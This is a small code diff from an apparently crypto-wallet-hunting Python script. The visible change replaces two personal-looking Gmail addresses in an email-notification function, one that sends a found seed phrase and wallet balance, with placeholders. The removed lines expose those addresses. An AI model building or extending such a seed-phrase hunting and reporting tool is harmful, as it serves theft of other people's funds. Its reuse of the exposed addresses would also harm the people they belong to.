@@ -61,8 +61,8 @@ def find_wallet_with_funds():
 
 # Function to send email notification
 def send_email_notification(seed_phrase, balance):
-    sender_email = "nerdgod21@gmail.com"  # Your email
-    receiver_email = "dylieberman@gmail.com"  # Receiver email (can be your own)
+    sender_email = "email@gmail.com"  # Your email
+    receiver_email = "email@gmail.com"  # Receiver email (can be your own)
     password = ""  # Your email password or app password
 
     # Create the email content
